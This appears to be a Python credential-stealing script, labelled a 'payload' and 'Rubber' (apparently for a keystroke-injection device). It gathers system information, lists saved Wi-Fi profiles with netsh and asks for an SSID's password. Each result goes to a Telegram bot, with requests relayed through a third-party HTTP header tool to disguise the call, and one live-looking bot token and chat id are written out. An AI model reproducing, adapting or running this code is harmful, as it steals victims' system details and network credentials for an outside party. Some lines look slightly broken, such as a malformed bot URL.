import requests
import platform
import subprocess

info = str(platform.uname())

msg = "User Started The Payload...!"
start = ("https://api.telegram.org/bot[bot token]/sendmessage?chat_id=[chat id]&text="+msg)
url = ("https://api.telegram.org/bo[bot token]/sendmessage?chat_id=[chat id]&text="+"User System info : "+ "\n" +info)

run = {
    
    "UrlBox":start,
    "AgentList":"Google Chrome",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",run)

print(run)

seve = {
    
    "UrlBox":url,
    "AgentList":"Google Chrome",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",seve)

print(req)

# Wifi Payload

# Wifi list Rubber

wifi_list = "netsh wlan show profile"
name = subprocess.getoutput(wifi_list).replace("Profiles on interface Wi-Fi:","").replace("Group policy profiles (read only)","").replace("---------------------------------","").replace("<None>","")

wlist = ("https://api.telegram.org/bot5342545382:AAFExqqlDSN07bR7hxcfPglPi4FrAVwiSBo/sendmessage?chat_id=1695284450&text="+name)

file = {
    
    "UrlBox":wlist,
    "AgentList":"Google Chrome",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",file)

print(req)


# # # # # # #

# Wifi Password Rubber

d= print("Please Enter You're SSID Name: ", "\n")
v = input("Name >> ")
name2 = subprocess.getoutput("wifipassword "+ v)

line = ("https://api.telegram.org/bot5342545382:AAFExqqlDSN07bR7hxcfPglPi4FrAVwiSBo/sendmessage?chat_id=1695284450&text="+name2)

made = {
    
    "UrlBox":line,
    "AgentList":"Google Chrome",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",made)

print(req)


# # # # # # # 

